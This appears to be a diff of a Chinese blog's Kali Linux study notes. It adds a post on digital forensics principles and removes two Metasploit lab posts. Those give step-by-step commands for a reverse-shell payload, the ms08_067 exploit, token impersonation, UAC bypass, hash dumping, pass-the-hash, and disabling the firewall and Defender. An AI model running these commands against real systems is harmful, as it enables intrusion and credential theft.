+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T11:52:55+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  993 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-取证科学简介"><a href="#1-取证科学简介" class="headerlink" title="1. 取证科学简介"></a>1. 取证科学简介</h4><ul>
+<li>Forensic investigations</li>
+<li>法庭取证调查</li>
+<li>事件响应调查<ul>
+<li>黑客攻击、渗透测试痕迹</li>
+</ul>
+</li>
+</ul>
+<p>![CSI：CRIME SCENE INVESTIGATION](/images/kali/kali-notepad/CSI：CRIME SCENE INVESTIGATION.png)</p>
+<h4 id="2-取证科学"><a href="#2-取证科学" class="headerlink" title="2. 取证科学"></a>2. 取证科学</h4><ul>
+<li>什么是Forensic科学<ul>
+<li>法医的、用于法庭的、辩论学、法医学</li>
+<li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法<ul>
+<li>参考本地区法律要求</li>
+<li>实践操作通用原则</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>CSI：物理取证<ul>
+<li>指纹、DNA、弹道、血迹</li>
+<li>物理取证的理论基础是物质交换原则</li>
+</ul>
+</li>
+<li>本章关注：数字取证 / 计算机取证 / 电子取证<ul>
+<li>智能设备、计算机、手机平板、IoT、有线及无线通信（Wireshark抓包分析）、数据存储</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-通用原则"><a href="#3-通用原则" class="headerlink" title="3. 通用原则"></a>3. 通用原则</h4><ul>
+<li>维护证据完整性<ul>
+<li>数字取证比物理取证幸运的多，可以有无限数量的拷贝进行分析<ul>
+<li>▲ 对iphone手机芯片的复制，可以实现理论上的暴力破解</li>
+</ul>
+</li>
+<li>数字HASH值验证数据完整性</li>
+</ul>
+</li>
+<li>维护监管链<ul>
+<li>物理证物保存在证物袋中，每次取出使用严格记录，避免破坏污染</li>
+<li>数字证物原始版本写保护，使用拷贝进行分析</li>
+</ul>
+</li>
+<li>标准的操作步骤<ul>
+<li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li>
+</ul>
+</li>
+<li>取证分析全部过程记录文档</li>
+<li>数字取证者的座右铭<ul>
+<li>不要破坏数据现场（看似简单，实际几乎无法实现）<ul>
+<li>系统命令可能被植入木马，整个计算机都不可信 → 使用干净U盘的操作系统命令</li>
+<li>使用干净U盘的操作系统命令可能也会占用内存资源，破坏现场</li>
+<li>▲ 虚拟机一定程度上通过控制台可实现不破坏数据现场</li>
+</ul>
+</li>
+<li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li>
+<li>系统内存是主要的易失性存储介质取证对象，不修改无法获取其中数据<ul>
+<li>程序、操作系统指令会对内存进行修改</li>
+</ul>
+</li>
+<li>非易失性存储介质通常使用完整镜像拷贝保存<ul>
+<li>不同于文件拷贝，从磁道层面的复制（01代码的复制，可能包含已删除的文件）</li>
+</ul>
+</li>
+<li>正常关机还是直接拔掉电源（数据丢失破坏）<ul>
+<li>拔电源：存在于内存中的数据无法保存到硬盘</li>
+<li>正常关机：木马程序可能进行数据擦除破坏</li>
+<li>▲ 建议拔电源，Ext4日志型文件型系统直接拔电源，不会丢失日志</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>证据搜索<ul>
+<li>数据（数据提炼）</li>
+<li>信息（信息收集）</li>
+<li>证据（得出入侵的证据 → 法庭的呈堂证供/技术分析）</li>
+</ul>
+</li>
+<li>作为安全从业者<ul>
+<li>通过取证还原黑客入侵的轨迹</li>
+<li>作为渗透测试和黑客攻击区分标准<ul>
+<li>世纪佳缘事件</li>
+<li>印象笔记渗透测试事件</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-取证方法"><a href="#4-取证方法" class="headerlink" title="4. 取证方法"></a>4. 取证方法</h4><ul>
+<li>活取证（服务器未关机，可对内存和硬盘取证）<ul>
+<li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li>
+<li>使用未受感染的干净程序执行取证</li>
+<li>U盘 / 网络存储收集到的数据</li>
+<li>▲ 新建用户取证</li>
+</ul>
+</li>
+<li>死取证（服务器关机、可对硬盘取证）<ul>
+<li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）<ul>
+<li>硬盘格式<ul>
+<li>大块MBR</li>
+<li>全局分区表GPT</li>
+<li>逻辑卷LVM</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-取证工具–Dumpit"><a href="#5-取证工具–Dumpit" class="headerlink" title="5. 取证工具–Dumpit"></a>5. 取证工具–Dumpit</h4><ul>
+<li>不考虑法律因素、法庭证据、监管链、文档记录等取证环节</li>
+<li>只介绍Kali当中部分取证工具的使用方法</li>
+<li>内存dump工具<ul>
+<li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2011/07/DumpIt.zip</a><ul>
+<li>▲ 2020.03.04 此连接失效，改为后续链接：<a href="http://www.secist.com/archives/2076.html" target="_blank" rel="noopener">http://www.secist.com/archives/2076.html</a></li>
+</ul>
+</li>
+<li>内存文件与内存大小接近或者稍微大一点，raw格式</li>
+</ul>
+</li>
+<li>实验<ul>
+<li>Window 7</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=2638rdSKJV3HVd-tYIUJnkoRfqNDQSyiuMX3yluETjB9O1Ve6zMIW2fFmrDkG0M3vtkS580i71YLHOwz3PrU-Gb7Af2x256yinj9RuvNRJ54sAwdNjtm&file_name=/Dumpit.png" alt="Dumpit"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%9B%9B)%EF%BC%9A%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2426,1064 +3425,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:31:17+08:00">
-                2020-03-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  785 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
-<li>已经获得目标系统控制权后扩大战果<ul>
-<li>提权</li>
-<li>信息收集</li>
-<li>渗透内网</li>
-<li>永久后门</li>
-</ul>
-</li>
-<li>实验环境<ul>
-<li>Window 7<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>关闭防火墙</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
-<li><strong><code>🔺命令：service apache2 start</code></strong></li>
-<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
-<li>双击打开1.exe</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看是否拿到shell</li>
-<li><strong><code>🔺命令：session -l</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：load priv</code></strong> </li>
-<li><strong><code>🔺命令：getsystem</code></strong> <ul>
-<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
-<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
-<li>Tokens<ul>
-<li>用户每次登陆，账号绑定临时的Token</li>
-<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
-<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
-<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
-<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
-<li>▲ 域管理员登陆注销后，依然依存这Token</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Incognito<ul>
-<li>独立功能的软件，被MSF集成在meterpreter中</li>
-<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
-<li>尤其适用于域环境下提权渗透多操作系统</li>
-</ul>
-</li>
-<li>搭建域环境<ul>
-<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
-<li>Window Server 2003<ul>
-<li>配置静态IP地址，DNS服务器指向自己</li>
-<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
-<li>DNS全名：lab.com</li>
-<li>重新启动服务器</li>
-<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
-</ul>
-</li>
-<li>Window XP SP3<ul>
-<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
-<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
-<li>重新启动机器</li>
-<li>用域账号Administrator登陆，关闭防火墙</li>
-<li>再用域账号u1登陆</li>
-</ul>
-</li>
-<li>Window Server 2003<ul>
-<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
-<li><strong><code>🔺命令：set target 34</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：load incognito</code></strong><ul>
-<li>使用伪装Token需要提权为本地SYSTEM权限</li>
-<li>查看组的Token：<strong><code>🔺命令：list_tokens -u</code></strong></li>
-<li>伪装Token：<strong><code>🔺命令：impersonate_token lab\\administrator</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：execute -f cmd.exe -i -t</code></strong> # -t：使用当前假冒token执行程序</li>
-<li><strong><code>🔺命令：shell</code></strong><ul>
-<li><strong><code>🔺命令：net user a a /add</code></strong>（增加账号尝试）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>▲ 本地普通权限用户需先本地提权<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ms10_015_kitrap0d</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B8%83)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--UAC%E6%8F%90%E6%9D%83/" itemprop="url">Kali Linux笔记(一百零七)：MSF后渗透测试--UAC提权</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:28:28+08:00">
-                2020-03-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  1.1k 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  5 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
-<li>已经获得目标系统控制权后扩大战果<ul>
-<li>提权</li>
-<li>信息收集</li>
-<li>渗透内网</li>
-<li>永久后门</li>
-</ul>
-</li>
-<li>实验环境<ul>
-<li>Window 7<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-<li>关闭防火墙</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
-<li><strong><code>🔺命令：service apache2 start</code></strong></li>
-<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
-<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
-<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
-<li>双击打开1.exe</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看是否拿到shell</li>
-<li><strong><code>🔺命令：session -l</code></strong></li>
-</ul>
-</li>
-</ul>
-<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：load priv</code></strong> </li>
-<li><strong><code>🔺命令：getsystem</code></strong> <ul>
-<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
-<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h4 id="4-绕过UAC限制-1"><a href="#4-绕过UAC限制-1" class="headerlink" title="4. 绕过UAC限制-1"></a>4. 绕过UAC限制-1</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/ask</code></strong><ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-</ul>
-</li>
-<li><strong><code>🔺命令：set filename 欺骗性的文件名.exe</code></strong><ul>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>UAC → 是</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>查看是否拿到更高权限</li>
-<li><strong><code>🔺命令：session -i 2</code></strong></li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：load priv</code></strong></li>
-<li><strong><code>🔺命令：getsystem</code></strong></li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-绕过UAC限制-2"><a href="#5-绕过UAC限制-2" class="headerlink" title="5. 绕过UAC限制-2"></a>5. 绕过UAC限制-2</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/bypassuac</code></strong>（EXE执行程序）<ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看是否弹窗</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：load priv</code></strong></li>
-<li><strong><code>🔺命令：getsystem</code></strong></li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-</ul>
-</li>
-<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
-</ul>
-<h4 id="6-绕过UAC限制-3"><a href="#6-绕过UAC限制-3" class="headerlink" title="6. 绕过UAC限制-3"></a>6. 绕过UAC限制-3</h4><ul>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看是否弹窗</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：load priv</code></strong></li>
-<li><strong><code>🔺命令：getsystem</code></strong></li>
-<li><strong><code>🔺命令：getuid</code></strong>（查看是否为SYSTEM权限）</li>
-</ul>
-</li>
-<li>▲ 2020.03.02 对于非admins group，无法提升权限</li>
-</ul>
-<h4 id="7-UAC利用"><a href="#7-UAC利用" class="headerlink" title="7. UAC利用"></a>7. UAC利用</h4><ul>
-<li>▲ 需要提前关闭UAC</li>
-<li>Kali<ul>
-<li><strong><code>🔺命令：use exploit/windows/local/bypassuac_injection</code></strong>（注入DLL库）<ul>
-<li><strong><code>🔺命令：set session 1</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：load priv</code></strong></li>
-<li><strong><code>🔺命令：getsystem</code></strong></li>
-<li><strong><code>🔺命令：getuid</code></strong></li>
-<li><strong><code>🔺命令：hashdump</code></strong><ul>
-<li>▲ 2020.03.03 Operation failed：The parameter is incorrect</li>
-<li>▲ 2020.03.03 run post/windows/gather/hashdump调用不一定能行</li>
-<li>▲ 2020.03.03 在非Meterpreter下，<strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>，可在非SYSTEM权限下成功获取到哈希值</li>
-</ul>
-</li>
-<li><strong><code>🔺命令：shell</code></strong>（添加注册表键值，关闭UAC验证）<ul>
-<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
-<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</code></strong> </li>
-<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong></li>
-<li><strong><code>🔺命令：cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</code></strong><ul>
-<li><strong><code>🔺命令：shutdown -r -t 0</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>确认UAC功能是否关闭</li>
-<li>▲ 查看UAC方法（Win7）：开始 → 控制面板 → 查看方式：大图标 → 操作中心 → 更改用户账户控制设置</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>Psexec模块之 Passthehash<ul>
-<li><strong><code>🔺命令：use exploit/windows/smb/psexec</code></strong> <ul>
-<li><strong><code>🔺命令：set rhost Window 7的IP</code></strong></li>
-<li><strong><code>🔺命令：set smbuser w7</code></strong></li>
-<li><strong><code>🔺命令：set smbpass 取得的hash值密文</code></strong></li>
-<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
-<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
-<li><strong><code>🔺命令：exploit</code></strong></li>
-</ul>
-</li>
-<li>hash值root:toor(aad3b435b51404eeaad3b435b51404ee:3bdfee3835ee03d4283d4569ec1263e4:::)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>▲ 2020.03.03 该模块包报错，UnexpectedStatusCode STATUS_USER_SESSION_DELETED</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>开启防火墙</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>关闭防火墙<ul>
-<li>需要管理员或system权限</li>
-<li><strong><code>🔺命令：shell</code></strong><ul>
-<li><strong><code>🔺命令：netsh advfirewall set allprofiles state off</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看防火墙是否被关闭</li>
-<li>Win+R → services.msc → 查看Windefend是否开启状态</li>
-</ul>
-</li>
-<li>Kali<ul>
-<li>关闭Windefend<ul>
-<li><strong><code>🔺命令：shell</code></strong><ul>
-<li><strong><code>🔺命令：net stop windefend</code></strong></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Window 7<ul>
-<li>查看Windefend是否被关闭</li>
-<li>关闭远程桌面服务</li>
-</ul>
